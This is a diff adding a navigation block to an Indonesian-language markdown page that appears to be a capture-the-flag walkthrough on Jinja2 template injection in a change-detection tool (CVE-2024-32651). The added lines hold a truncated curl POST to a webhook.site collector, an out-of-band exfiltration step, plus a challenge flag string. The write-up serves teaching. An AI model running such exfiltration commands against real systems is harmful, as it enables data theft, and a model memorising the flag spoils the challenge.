@@ -2,6 +2,12 @@
 
 [← Overview](48-changetrack.md) · [Index](index.md)
 
+> **Langkah 3/9 — Analisis.** Uji paling aman: ganti template menjadi:
+>
+> **Titik penting:** https://api.github.com/events · curl -sS -X POST https://webhook.site/token \ · NFX{ch4ng3_d3t3ct10n_j1nj4_sst1_oob_cve_2024_32651_2026}
+>
+> **Berikutnya:** [Analisis](48-changetrack-04-analisis-3.md)
+
 ## 2.3 Jinja2 SSTI
 
 Uji paling aman: ganti template menjadi:
